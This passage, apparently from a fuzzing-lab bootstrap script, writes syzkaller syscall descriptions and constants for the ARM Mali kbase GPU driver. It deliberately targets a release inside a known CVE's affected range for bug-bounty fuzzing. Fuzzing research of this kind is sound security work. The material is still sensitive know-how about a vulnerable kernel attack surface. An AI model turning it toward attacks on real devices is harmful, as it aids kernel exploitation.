base_jd_core_req = BASE_JD_REQ_DEP, BASE_JD_REQ_FS, BASE_JD_REQ_CS, BASE_JD_REQ_T, BASE_JD_REQ_CF, BASE_JD_REQ_V, BASE_JD_REQ_FS_AFBC, BASE_JD_REQ_EVENT_COALESCE, BASE_JD_REQ_COHERENT_GROUP, BASE_JD_REQ_PERMON, BASE_JD_REQ_EXTERNAL_RESOURCES, BASE_JD_REQ_SOFT_JOB, BASE_JD_REQ_ONLY_COMPUTE, BASE_JD_REQ_SPECIFIC_COHERENT_GROUP, BASE_JD_REQ_EVENT_ONLY_ON_FAILURE, BASE_JD_REQ_SKIP_CACHE_START, BASE_JD_REQ_SKIP_CACHE_END, BASE_JD_REQ_JOB_SLOT, BASE_JD_REQ_START_RENDERPASS, BASE_JD_REQ_END_RENDERPASS
kbase_ioctl_mem_query_flags = KBASE_MEM_QUERY_COMMIT_SIZE, KBASE_MEM_QUERY_VA_SIZE, KBASE_MEM_QUERY_FLAGS
base_syncset_op_flags = BASE_SYNCSET_OP_MSYNC, BASE_SYNCSET_OP_CSYNC
# 0x400000-0x2000000 are individual bits of BASE_MEM_GROUP_ID_MASK
# (r41p0 has no BASE_MEM_TILER_ALIGN_TOP_EXTENT_MAX_PAGES — ChromeOS-bifrost only)
base_mem_alloc_flags = BASE_MEM_PROT_CPU_RD, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_GPU_RD, BASE_MEM_PROT_GPU_WR, BASE_MEM_PROT_GPU_EX, BASEP_MEM_PERMANENT_KERNEL_MAPPING, BASE_MEM_GPU_VA_SAME_4GB_PAGE, BASEP_MEM_NO_USER_FREE, BASE_MEM_RESERVED_BIT_8, BASE_MEM_GROW_ON_GPF, BASE_MEM_COHERENT_SYSTEM, BASE_MEM_COHERENT_LOCAL, BASE_MEM_CACHED_CPU, BASE_MEM_SAME_VA, BASE_MEM_NEED_MMAP, BASE_MEM_COHERENT_SYSTEM_REQUIRED, BASE_MEM_PROTECTED, BASE_MEM_DONT_NEED, BASE_MEM_IMPORT_SHARED, BASE_MEM_RESERVED_BIT_19, BASE_MEM_TILER_ALIGN_TOP, BASE_MEM_UNCACHED_GPU, 0x400000, 0x800000, 0x1000000, 0x2000000, BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP, BASE_MEM_FLAG_MAP_FIXED
base_mem_import_type = BASE_MEM_IMPORT_TYPE_INVALID, BASE_MEM_IMPORT_TYPE_UMM, BASE_MEM_IMPORT_TYPE_USER_BUFFER
# 0x08-0x20 are individual bits of BASEP_CONTEXT_MMU_GROUP_ID_MASK
basep_context_create_kernel_flags = BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED, 0x8, 0x10, 0x20, 0x40
base_timerequest_allowed_flags = BASE_TIMEINFO_MONOTONIC_FLAG, BASE_TIMEINFO_TIMESTAMP_FLAG, BASE_TIMEINFO_CYCLE_COUNTER_FLAG, BASE_TIMEINFO_KERNEL_SOURCE_FLAG, BASE_TIMEINFO_USER_SOURCE_FLAG
__PL_14__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r41p0.txt" "b513686f4d89c67d08eb88c1d36125f4b8509eff8f60caad9c25a65d632fdc91"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r41p0.txt.const")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r41p0.txt.const" <<'__PL_15__'
# Code generated by syz-sysgen. DO NOT EDIT.
arches = amd64, arm64
AT_FDCWD = 18446744073709551516
BASEP_MEM_INVALID_HANDLE = 0
BASEP_MEM_NO_USER_FREE = 128
BASEP_MEM_PERMANENT_KERNEL_MAPPING = 32
BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE = 16384
BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED = 2
BASE_JD_DEP_TYPE_DATA = 1
BASE_JD_DEP_TYPE_INVALID = 0
BASE_JD_DEP_TYPE_ORDER = 2
BASE_JD_PRIO_HIGH = 1
BASE_JD_PRIO_LOW = 2
BASE_JD_PRIO_MEDIUM = 0
BASE_JD_REQ_CF = 8
BASE_JD_REQ_COHERENT_GROUP = 64
BASE_JD_REQ_CS = 2
BASE_JD_REQ_DEP = 0
BASE_JD_REQ_END_RENDERPASS = 524288
BASE_JD_REQ_EVENT_COALESCE = 32
BASE_JD_REQ_EVENT_ONLY_ON_FAILURE = 4096
BASE_JD_REQ_EXTERNAL_RESOURCES = 256
BASE_JD_REQ_FS = 1
BASE_JD_REQ_FS_AFBC = 8192
BASE_JD_REQ_JOB_SLOT = 131072
BASE_JD_REQ_ONLY_COMPUTE = 1024
BASE_JD_REQ_PERMON = 128
BASE_JD_REQ_SKIP_CACHE_END = 65536
BASE_JD_REQ_SKIP_CACHE_START = 32768
BASE_JD_REQ_SOFT_JOB = 512
BASE_JD_REQ_SPECIFIC_COHERENT_GROUP = 2048
BASE_JD_REQ_START_RENDERPASS = 262144
BASE_JD_REQ_T = 4
BASE_JD_REQ_V = 16
BASE_MEM_CACHED_CPU = 4096
BASE_MEM_COHERENT_LOCAL = 2048
BASE_MEM_COHERENT_SYSTEM = 1024
BASE_MEM_COHERENT_SYSTEM_REQUIRED = 32768
BASE_MEM_DONT_NEED = 131072
BASE_MEM_FLAG_MAP_FIXED = 134217728
BASE_MEM_GPU_VA_SAME_4GB_PAGE = 64
BASE_MEM_GROW_ON_GPF = 512
BASE_MEM_IMPORT_SHARED = 262144
BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP = 67108864
BASE_MEM_IMPORT_TYPE_INVALID = 0
BASE_MEM_IMPORT_TYPE_UMM = 2
BASE_MEM_IMPORT_TYPE_USER_BUFFER = 3
BASE_MEM_NEED_MMAP = 16384
BASE_MEM_PROTECTED = 65536
BASE_MEM_PROT_CPU_RD = 1
BASE_MEM_PROT_CPU_WR = 2
BASE_MEM_PROT_GPU_EX = 16
BASE_MEM_PROT_GPU_RD = 4
BASE_MEM_PROT_GPU_WR = 8
BASE_MEM_RESERVED_BIT_19 = 524288
BASE_MEM_RESERVED_BIT_8 = 256
BASE_MEM_SAME_VA = 8192
BASE_MEM_TILER_ALIGN_TOP = 1048576
BASE_MEM_UNCACHED_GPU = 2097152
BASE_SYNCSET_OP_CSYNC = 2
BASE_SYNCSET_OP_MSYNC = 1
BASE_TIMEINFO_CYCLE_COUNTER_FLAG = 4
BASE_TIMEINFO_KERNEL_SOURCE_FLAG = 1073741824
BASE_TIMEINFO_MONOTONIC_FLAG = 1
BASE_TIMEINFO_TIMESTAMP_FLAG = 2
BASE_TIMEINFO_USER_SOURCE_FLAG = 2147483648
KBASE_HWCNT_READER_CLEAR = 1074052625
KBASE_HWCNT_READER_DISABLE_EVENT = 1074052673
KBASE_HWCNT_READER_DUMP = 1074052624
KBASE_HWCNT_READER_ENABLE_EVENT = 1074052672
KBASE_HWCNT_READER_GET_API_VERSION = 1074052863
KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES = 1074315007
KBASE_HWCNT_READER_GET_BUFFER = 2148580896
KBASE_HWCNT_READER_GET_BUFFER_SIZE = 2147794433
KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES = 2149629472
KBASE_HWCNT_READER_GET_HWVER = 2147794432
KBASE_HWCNT_READER_PUT_BUFFER = 1074839073
KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES = 1075887649
KBASE_HWCNT_READER_SET_INTERVAL = 1074052656
KBASE_IOCTL_CONTEXT_PRIORITY_CHECK = 3221323830
KBASE_IOCTL_DISJOINT_QUERY = 2147778572
KBASE_IOCTL_FENCE_VALIDATE = 1074036761
KBASE_IOCTL_GET_CONTEXT_ID = 2147778577
KBASE_IOCTL_GET_CPU_GPU_TIMEINFO = 3223355442
KBASE_IOCTL_GET_DDK_VERSION = 1074823181
KBASE_IOCTL_GET_GPUPROPS = 1074823171
KBASE_IOCTL_HWCNT_READER_SETUP = 1075085320
KBASE_IOCTL_HWCNT_SET = 1074823200
KBASE_IOCTL_JOB_SUBMIT = 1074823170
KBASE_IOCTL_KINSTR_JM_FD = 3221782579
KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO = 3222306872
KBASE_IOCTL_KINSTR_PRFCNT_SETUP = 3222306873
KBASE_IOCTL_MEM_ALIAS = 3223355413
KBASE_IOCTL_MEM_ALLOC = 3223355397
KBASE_IOCTL_MEM_COMMIT = 1074823188
KBASE_IOCTL_MEM_EXEC_INIT = 1074298918
KBASE_IOCTL_MEM_FIND_CPU_OFFSET = 3222831120
KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET = 3222306847
KBASE_IOCTL_MEM_FLAGS_CHANGE = 1075347479
KBASE_IOCTL_MEM_FREE = 1074298887
KBASE_IOCTL_MEM_IMPORT = 3222831126
KBASE_IOCTL_MEM_JIT_INIT = 1075347470
KBASE_IOCTL_MEM_PROFILE_ADD = 1074823195
KBASE_IOCTL_MEM_QUERY = 3222306822
KBASE_IOCTL_MEM_SYNC = 1075871759
KBASE_IOCTL_POST_TERM = 32772
KBASE_IOCTL_SET_FLAGS = 1074036737
KBASE_IOCTL_SET_LIMITED_CORE_COUNT = 1073840183
KBASE_IOCTL_SOFT_EVENT_UPDATE = 1074823196
KBASE_IOCTL_STICKY_RESOURCE_MAP = 1074823197
KBASE_IOCTL_STICKY_RESOURCE_UNMAP = 1074823198
KBASE_IOCTL_STREAM_CREATE = 1075871768
KBASE_IOCTL_TLSTREAM_ACQUIRE = 1074036754
KBASE_IOCTL_TLSTREAM_FLUSH = 32787
KBASE_IOCTL_VERSION_CHECK = 3221520384
KBASE_IOCTL_VERSION_CHECK_RESERVED = 3221520436
KBASE_MEM_QUERY_COMMIT_SIZE = 1
KBASE_MEM_QUERY_FLAGS = 3
KBASE_MEM_QUERY_VA_SIZE = 2
__NR_ioctl = amd64:16, arm64:29
__NR_mmap = amd64:9, arm64:222
__NR_munmap = amd64:11, arm64:215
__NR_openat = amd64:257, arm64:56
__PL_15__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r41p0.txt.const" "cf31621374f3e17e77fae07de2452233b01445f4be5a001e06c95e4512596368"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0.txt")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0.txt" <<'__PL_16__'
# syzkaller syscall descriptions for the Mali "kbase" UAPI.
#
# RELEASE-MATCHED to: r36p0-01eac0 (Bifrost/Valhall DDK, UAPI UK ~11.25 era,
# POST the CVE-2021-28663 fix), JOB MANAGER mode (MALI_USE_CSF == 0) as built
# by this lab's default combo (KERNEL_VERSION=5.10.30 + DRIVER_VERSION=
# r36p0-01eac0 + DRIVER_FAMILY=bifrost, NO_MALI dummy model, banner
# "Kernel DDK version r36p0-01eac0"). r36p0-01eac0 is inside the documented
# CVE-2022-38181 affected range (Bifrost/Valhall <= r38p1 + r39p0; fixed <=
# r41p0), making it the lab's bounty-program vehicle.
#
# Provenance & verification:
# - Derived field-by-field from dev_mali_r41p0.txt (Phase E, evidence/06) and
#   cross-checked against this release's pristine uapi headers under
#   harness/release_uapi/r36p0 (regenerated from the staged/downloaded
#   BX304L01B-SW-99002-r36p0-01eac0.tar by gen_release_uapi).
# - r36p0 vs r41p0 delta (the ONLY differences from the r41p0 description):
#   * + MEM_JIT_INIT_10_2 (8B) and MEM_JIT_INIT_11_5 (16B) — same nr 14 as
#     the 24B MEM_JIT_INIT, distinguished by _IOC_SIZE (all three survive in
#     r36p0 headers; removed in UK 11.36 / r41p0).
#   * - include <gpu/arm/midgard/mali_base_common_kernel.h> (r41p0-only
#     header; r36p0 keeps that content inside mali_base_kernel.h).
#   * every other modelled struct is byte-identical between the two releases
#     (base_jd_atom_v2 56B with jit_id[2]+renderpass_id, hwcnt metadata 32B
#     with cycles, timeinfo in.paddings __u32[7], mem_jit_init 24B) — proven
#     by the _Static_assert gate in layout_check_r36p0.c (see below).
# - Dispatch cross-check (mali_kbase_core_linux.c switch in r36p0): every
#   modelled ioctl is a live case for a NO_MALI build; JM-only cases
#   (JOB_SUBMIT, POST_TERM, SOFT_EVENT_UPDATE, KINSTR_JM_FD) are behind
#   #if !MALI_USE_CSF and are correct for this JM-mode description.
# - Excluded as unreachable (documented, not silently): CINSTR_GWT_*
#   (needs CONFIG_MALI_CINSTR_GWT, unset in the lab fragment),
#   TLSTREAM_STATS/EXTRA_TYPE/MY_IOCTL/TEST_TYPE (MALI_UNIT_TEST only),
#   legacy KBASE_IOCTL_HWCNT_ENABLE/DUMP/CLEAR (removed before r36p0),
#   CS_* queue/KCPU/tiler ioctls + MEM_ALLOC_EX (MALI_USE_CSF — modelled
#   separately in dev_mali_r36p0-csf.txt, the MALI_MODE=csf companion).
#   GET_PROFILING_CONTROLS does not exist in r36p0 headers.
#
# Union-style ioctl structs: kbase passes in/out views of one buffer. Fields
# that alias the kernel's out-view slot are typed as the out value and marked
# (inout), e.g. MEM_ALLOC@8 = commit_pages(in)/gpu_va(out); the executor then
# copyouts the kernel-returned GPU VA into the gpu_addr resource, enabling
# alloc -> use -> free chaining while keeping the modeled size == the exact
# release _IOC_SIZE. See evidence/06 for the offset mapping table.
#
# Consts in dev_mali_r36p0.txt.const are extracted from the r36p0 headers by
# the bootstrap script (extract_consts, F5-validated overlay recipe):
#   bin/syz-extract -arch amd64,arm64 -sourcedir <hardlink mirror of $KT with
#       the uapi/gpu shadow dropped> -includedirs harness/release_uapi/r36p0 \
#       dev_mali_r36p0.txt
# Both arches are extracted because sysgen only emits syscall entries for
# arches declared in the const file; mali UAPI consts are LP64/asm-generic
# identical, and the run gates on that equality.
# Keep this file `meta noextract` so `make extract` cannot clobber the
# release-matched consts with values from an unrelated kernel tree.
meta noextract


include <gpu/arm/midgard/mali_base_kernel.h>
include <gpu/arm/midgard/jm/mali_base_jm_kernel.h>
include <gpu/arm/midgard/mali_kbase_ioctl.h>
include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>
include <uapi/linux/fcntl.h>
include <linux/types.h>

resource fd_bifrost[fd]
resource gpu_addr[int64]: BASEP_MEM_INVALID_HANDLE, BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE
resource user_addr[int64]: -1
resource fd_fence[fd]
resource fd_hwcnt[fd]

openat$bifrost(fd const[AT_FDCWD], file ptr[in, string["/dev/bifrost"]], flags flags[open_flags], mode const[0]) fd_bifrost
# Our NO_MALI build registers miscdevice mali0 -> /dev/mali0
openat$mali(fd const[AT_FDCWD], file ptr[in, string["/dev/mali0"]], flags flags[open_flags], mode const[0]) fd_bifrost

# GPU VA mmap: kbase's vm_pgoff encodes the region cookie (Phase D smoke:
# mmap(offset=cookie) materializes the SAME_VA region).
mmap$bifrost(addr const[0], len len[addr], prot flags[mmap_prot], flags flags[mmap_flags], fd fd_bifrost, offset fileoff) user_addr
munmap$bifrost(addr user_addr, len intptr)

ioctl$KBASE_IOCTL_JOB_SUBMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_JOB_SUBMIT], arg ptr[in, kbase_ioctl_job_submit])
ioctl$KBASE_IOCTL_POST_TERM(fd fd_bifrost, cmd const[KBASE_IOCTL_POST_TERM], arg const[0])
ioctl$KBASE_IOCTL_SOFT_EVENT_UPDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_SOFT_EVENT_UPDATE], arg ptr[in, kbase_ioctl_soft_event_update])
ioctl$KBASE_IOCTL_VERSION_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK_RESERVED], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_SET_FLAGS(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_FLAGS], arg ptr[in, kbase_ioctl_set_flags])
ioctl$KBASE_IOCTL_GET_GPUPROPS(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_GPUPROPS], arg ptr[inout, kbase_ioctl_get_gpuprops])
ioctl$KBASE_IOCTL_MEM_ALLOC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC], arg ptr[inout, kbase_ioctl_mem_alloc])
# in-view only: out.value aliases the gpu_addr@0 slot; observing it would
# poison the gpu_addr resource with non-address query values.
ioctl$KBASE_IOCTL_MEM_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_QUERY], arg ptr[in, kbase_ioctl_mem_query])
ioctl$KBASE_IOCTL_MEM_FREE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FREE], arg ptr[in, kbase_ioctl_mem_free])
ioctl$KBASE_IOCTL_HWCNT_READER_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_READER_SETUP], arg ptr[in, kbase_ioctl_hwcnt_reader_setup]) fd_hwcnt
ioctl$KBASE_IOCTL_HWCNT_SET(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_SET], arg ptr[inout, kbase_ioctl_hwcnt_values])
ioctl$KBASE_IOCTL_DISJOINT_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_DISJOINT_QUERY], arg ptr[out, kbase_ioctl_disjoint_query])
ioctl$KBASE_IOCTL_GET_DDK_VERSION(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_DDK_VERSION], arg ptr[inout, kbase_ioctl_get_ddk_version])
ioctl$KBASE_IOCTL_MEM_JIT_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT], arg ptr[in, kbase_ioctl_mem_jit_init])
# r36p0-only legacy JIT family on the SAME nr 14 (8B + 16B; distinguished by
# _IOC_SIZE, same pattern Phase F5 modeled for r28p0) — removed in r41p0.
ioctl$KBASE_IOCTL_MEM_JIT_INIT_10_2(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_10_2], arg ptr[in, kbase_ioctl_mem_jit_init_10_2])
ioctl$KBASE_IOCTL_MEM_JIT_INIT_11_5(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_11_5], arg ptr[in, kbase_ioctl_mem_jit_init_11_5])
ioctl$KBASE_IOCTL_MEM_EXEC_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_EXEC_INIT], arg ptr[in, kbase_ioctl_mem_exec_init])
ioctl$KBASE_IOCTL_MEM_SYNC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_SYNC], arg ptr[in, kbase_ioctl_mem_sync])
# in-view only: out.offset aliases gpu_addr@0 (not an address).
ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_CPU_OFFSET], arg ptr[in, kbase_ioctl_mem_find_cpu_offset])
ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET], arg ptr[inout, kbase_ioctl_mem_find_gpu_start_and_offset])
ioctl$KBASE_IOCTL_GET_CONTEXT_ID(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CONTEXT_ID], arg ptr[out, kbase_ioctl_get_context_id])
ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_ACQUIRE], arg ptr[in, kbase_ioctl_tlstream_acquire])
ioctl$KBASE_IOCTL_TLSTREAM_FLUSH(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_FLUSH], arg const[0])
ioctl$KBASE_IOCTL_MEM_COMMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_COMMIT], arg ptr[in, kbase_ioctl_mem_commit])
ioctl$KBASE_IOCTL_MEM_ALIAS(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALIAS], arg ptr[inout, kbase_ioctl_mem_alias])
ioctl$KBASE_IOCTL_MEM_IMPORT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_IMPORT], arg ptr[inout, kbase_ioctl_mem_import])
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FLAGS_CHANGE], arg ptr[in, kbase_ioctl_mem_flags_change])
ioctl$KBASE_IOCTL_STREAM_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_STREAM_CREATE], arg ptr[in, kbase_ioctl_stream_create]) fd_fence
ioctl$KBASE_IOCTL_FENCE_VALIDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_FENCE_VALIDATE], arg ptr[in, kbase_ioctl_fence_validate])
ioctl$KBASE_IOCTL_MEM_PROFILE_ADD(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_PROFILE_ADD], arg ptr[in, kbase_ioctl_mem_profile_add])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_MAP], arg ptr[in, kbase_ioctl_sticky_resource_map])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_UNMAP], arg ptr[in, kbase_ioctl_sticky_resource_unmap])
ioctl$KBASE_IOCTL_KINSTR_JM_FD(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_JM_FD], arg ptr[in, kbase_kinstr_jm_fd])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO], arg ptr[inout, kbase_ioctl_kinstr_prfcnt_enum_info])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_SETUP], arg ptr[in, kbase_ioctl_kinstr_prfcnt_setup])
# in-view only (32B): out view aliases the request_flags/paddings slots.
ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CPU_GPU_TIMEINFO], arg ptr[in, kbase_ioctl_get_cpu_gpu_timeinfo])
ioctl$KBASE_IOCTL_CONTEXT_PRIORITY_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_CONTEXT_PRIORITY_CHECK], arg ptr[inout, kbase_ioctl_context_priority_check])
ioctl$KBASE_IOCTL_SET_LIMITED_CORE_COUNT(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_LIMITED_CORE_COUNT], arg ptr[in, kbase_ioctl_set_limited_core_count])

# hwcnt reader fd (returned by HWCNT_READER_SETUP) — mali_kbase_hwcnt_reader.h.
ioctl$KBASE_HWCNT_READER_GET_HWVER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_HWVER], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_SIZE], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_DUMP(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DUMP], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_CLEAR(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_CLEAR], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER], arg ptr[out, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES], arg ptr[out, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER], arg ptr[in, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES], arg ptr[in, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_SET_INTERVAL(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_SET_INTERVAL], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_ENABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_ENABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_DISABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DISABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_API_VERSION(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION], arg ptr[in, int32])
# same nr 0xFF, size-encoded newer variant (release drift axis)
ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES], arg ptr[in, kbase_hwcnt_reader_api_version])

type base_atom_id int8

base_jd_udata {
	blob	array[int64, 2]
}

base_dependency {
	atom_id			base_atom_id
	dependency_type	flags[base_jd_dep_type, int8]
}

base_jd_atom_v2 {
	jc			int64
	udata			base_jd_udata
	extres_list		int64
	nr_extres		int16
	jit_id			array[int8, 2]
	pre_dep			array[base_dependency, 2]
	atom_number		base_atom_id
	prio			flags[base_jd_prio, int8]
	device_nr		int8
	jobslot			int8
	core_req		flags[base_jd_core_req, int32]
	renderpass_id	int8
	padding			array[const[0, int8], 7]
}

kbase_ioctl_job_submit {
	addr		ptr64[in, array[base_jd_atom_v2]]
	nr_atoms	len[addr, int32]
# sizeof(base_jd_atom_v2)
	stride		const[56, int32]
}

kbase_ioctl_version_check {
	major	int16
	minor	int16
}

kbase_ioctl_set_flags {
	create_flags	flags[basep_context_create_kernel_flags, int32]
}

kbase_ioctl_get_gpuprops {
	buffer	ptr64[out, array[int8]]
	size	len[buffer, int32]
	flags	const[0, int32]
}

kbase_ioctl_mem_alloc {
# C union (32B): in {va_pages, commit_pages, extension, flags};
# out {flags@0, gpu_va@8}. @8 is modeled as the out view (gpu_va) so
# returned cookies populate gpu_addr (input value lands in commit_pages).
	va_pages	int64
	gpu_va		gpu_addr	(inout)
	extent		int64
	flags		flags[base_mem_alloc_flags, int64]
}

kbase_ioctl_mem_query {
	gpu_addr	gpu_addr
	query		flags[kbase_ioctl_mem_query_flags, int64]
}

kbase_ioctl_mem_free {
	gpu_addr	gpu_addr
}

kbase_ioctl_hwcnt_reader_setup {
	buffer_count	int32
	fe_bm			int32
	shader_bm		int32
	tiler_bm		int32
	mmu_l2_bm		int32
}

kbase_ioctl_hwcnt_values {
	data	ptr64[out, array[int8]]
	size	len[data, int32]
	padding	const[0, int32]
}

kbase_ioctl_disjoint_query {
	counter	int32
}

kbase_ioctl_get_ddk_version {
	version_buffer	ptr64[out, array[int8]]
	size			len[version_buffer, int32]
	padding			const[0, int32]
}

kbase_ioctl_mem_jit_init {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
	phys_pages		int64
}

# r36p0: struct kbase_ioctl_mem_jit_init_10_2 { __u64 va_pages } — 8B.
kbase_ioctl_mem_jit_init_10_2 {
	va_pages	int64
}

# r36p0: struct kbase_ioctl_mem_jit_init_11_5 — 16B (va_pages + 3 u8 + u8[5]).
kbase_ioctl_mem_jit_init_11_5 {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
}

kbase_ioctl_mem_exec_init {
	va_pages	int64
}

kbase_ioctl_mem_sync {
	handle		gpu_addr
	user_addr	user_addr
	size		int64
	type		flags[base_syncset_op_flags, int8]
	padding		array[const[0, int8], 7]
}

kbase_ioctl_mem_find_cpu_offset {
	gpu_addr	gpu_addr
	cpu_addr	user_addr
	size		int64
}

kbase_ioctl_mem_find_gpu_start_and_offset {
# union (16B): in {gpu_addr, size}; out {start@0, offset@8}. @0 doubles as
# out.start (a live region base) -> inout gpu_addr for chaining.
	gpu_addr	gpu_addr	(inout)
	size		int64		(inout)
}

kbase_ioctl_get_context_id {
	id	int32
}

kbase_ioctl_tlstream_acquire {
	flags	int32
}

kbase_ioctl_mem_commit {
	gpu_addr	gpu_addr
	pages		int64
}

kbase_ioctl_mem_alias {
# union (32B): in {flags, stride, nents, aliasing_info};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	gpu_va		gpu_addr	(inout)
	nents		len[aliasing_info, int64]
	aliasing_info	ptr64[in, array[base_mem_aliasing_info]]
}

base_mem_aliasing_info {
	handle	gpu_addr
	offset	int64
	length	int64
}

kbase_ioctl_mem_import {
# union (24B): in {flags, phandle, type, padding};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	phandle		gpu_addr	(inout)
	type		flags[base_mem_import_type, int32]
	padding		const[0, int32]
}

kbase_ioctl_mem_flags_change {
	gpu_va	gpu_addr
	flags	flags[base_mem_alloc_flags, int64]
	mask	int64
}

kbase_ioctl_stream_create {
	name	array[int8, 32]
}

kbase_ioctl_fence_validate {
	fd	fd_fence
}

kbase_ioctl_mem_profile_add {
	buffer	ptr64[in, array[int8]]
	len		len[buffer, int32]
	padding	const[0, int32]
}

kbase_ioctl_sticky_resource_map {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_sticky_resource_unmap {
	count	len[address, int64]
